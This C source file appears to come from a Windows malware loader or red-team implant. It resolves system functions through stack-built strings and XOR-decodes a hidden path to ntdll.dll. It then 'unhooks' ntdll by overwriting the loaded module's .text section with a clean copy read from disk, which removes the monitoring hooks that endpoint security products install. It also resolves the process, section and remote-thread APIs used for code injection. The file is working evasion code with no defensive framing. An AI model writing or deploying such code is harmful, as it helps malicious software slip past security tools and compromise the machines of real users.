#include "ntdll.h"
#include "addresshunter.h"

NtMapViewOfSecion_t NtMapViewOfSection = NULL;
NtUnmapViewOfSection_t NtUnmapViewOfSection = NULL;
RtlInitUnicodeString_t RtlInitUnicodeString = NULL;
RtlCreateProcessParameters_t RtlCreateProcessParameters = NULL;
RtlCreateUserProcess_t RtlCreateUserProcess = NULL;
RtlCreateUserThread_t RtlCreateUserThread = NULL;
NtClose_t NtClose = NULL;
NtResumeThread_t NtResumeThread = NULL;
ZwOpenProcess_t ZwOpenProcess = NULL;
ZwCreateSection_t ZwCreateSection = NULL;
ZwCreateThreadEx_t ZwCreateThreadEx = NULL;
NtDelayExecution_t NtDelayExecution = NULL;
CreateFileA_t pCreateFileA = NULL;
VirtualProtect_t pVirtualProtect = NULL;
CreateFileMappingA_t pCreateFileMappingA = NULL;
MapViewOfFile_t pMapViewOfFile = NULL;


void XORcrypt(char str2xor[], size_t len, char key) {
	/*
			XORcrypt() is a simple XOR encoding/decoding function
	*/
	int i;

	for (i = 0; i < len; i++) {
		str2xor[i] = (BYTE)str2xor[i] ^ key;
	}
}


void unhookNtdll(HMODULE ntdll)
{
	UINT64 kernel32dll;
	kernel32dll = GetKernel32();

	char cCreateFileA[] = {'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A',0};
	char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
	char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0 };
	char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };

	pCreateFileA = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, cCreateFileA);
	pCreateFileMappingA = (CreateFileMappingA_t)GetSymbolAddress((HANDLE)kernel32dll, sCreateFileMappingA);
	pMapViewOfFile = (MapViewOfFile_t)GetSymbolAddress((HANDLE)kernel32dll, sMapViewOfFile);
	pVirtualProtect = (VirtualProtect_t)GetSymbolAddress((HANDLE)kernel32dll, sVirtualProtect);

	HANDLE currentProcess = GetCurrentProcess();
	MODULEINFO ntdllInformation = {};
	unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
	unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
	unsigned int sNtdll_len = sizeof(sNtdll);
	unsigned int sNtdllPath_len = sizeof(sNtdllPath);

	XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	
	GetModuleInformation(currentProcess, ntdll, &ntdllInformation, sizeof(ntdllInformation));
	LPVOID ntdllBase = (LPVOID)ntdllInformation.lpBaseOfDll;
	HANDLE ntdllFile = pCreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = pCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = pMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (int i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!my_strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
		{
			DWORD oldProtection = 0;
			bool isProtected = pVirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			VxMoveMemory((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = pVirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
}

void checkNtStatus(NTSTATUS status)
{
	if (!NT_SUCCESS(status))
	{
		exit(1);
	}
}

void loadNtdll(HMODULE ntdll)
{
	
	char cNtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n',0 };;
	char cNtUnmapViewOfSection[] = { 'N', 't', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n',0 };
	char cRtlInitUnicodeString[] = { 'R', 't', 'l', 'I', 'n', 'i', 't', 'U', 'n', 'i', 'c', 'o', 'd', 'e', 'S', 't', 'r', 'i', 'n', 'g',0 };
	char cRtlCreateProcessParameters[] = { 'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r', 's',0 };
	char cRtlCreateUserProcess[] = { 'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'U', 's', 'e', 'r', 'P', 'r', 'o', 'c', 'e', 's', 's',0 };
	char cRtlCreateUserThread[] = { 'R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'U', 's', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd',0 };
	char cNtClose[] = { 'N', 't', 'C', 'l', 'o', 's', 'e',0 };
	char cNtResumeThread[] = { 'N', 't', 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd',0 };

	
	NtMapViewOfSection = (NtMapViewOfSecion_t)GetSymbolAddress((HANDLE)ntdll, cNtMapViewOfSection);
	NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetSymbolAddress((HANDLE)ntdll, cNtUnmapViewOfSection);
	RtlInitUnicodeString = (RtlInitUnicodeString_t)GetSymbolAddress((HANDLE)ntdll, cRtlInitUnicodeString);
	RtlCreateProcessParameters = (RtlCreateProcessParameters_t)GetSymbolAddress((HANDLE)ntdll, cRtlCreateProcessParameters);
	RtlCreateUserProcess = (RtlCreateUserProcess_t)GetSymbolAddress((HANDLE)ntdll, cRtlCreateUserProcess);
	RtlCreateUserThread = (RtlCreateUserThread_t)GetSymbolAddress((HANDLE)ntdll, cRtlCreateUserThread);
	
	NtClose = (NtClose_t)GetSymbolAddress((HANDLE)ntdll, cNtClose);
	NtResumeThread = (NtResumeThread_t)GetSymbolAddress((HANDLE)ntdll, cNtResumeThread);

	char cZwOpenProcess[] = { 'Z', 'w', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's',0 };
	char cZwCreateSection[] = { 'Z', 'w', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n',0 };
	char cZwCreateThreadEx[] = { 'Z', 'w', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x',0 };
	char cNtDelayExecution[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n',0 };
	char cZwClose[] = { 'Z', 'w', 'C', 'l', 'o', 's', 'e',0 };

	
	ZwCreateSection = (ZwCreateSection_t)GetSymbolAddress((HANDLE)ntdll, cZwCreateSection);
	ZwCreateThreadEx = (ZwCreateThreadEx_t)GetSymbolAddress((HANDLE)ntdll, cZwCreateThreadEx);
	NtDelayExecution = (NtDelayExecution_t)GetSymbolAddress((HANDLE)ntdll, cNtDelayExecution);
	
	
}
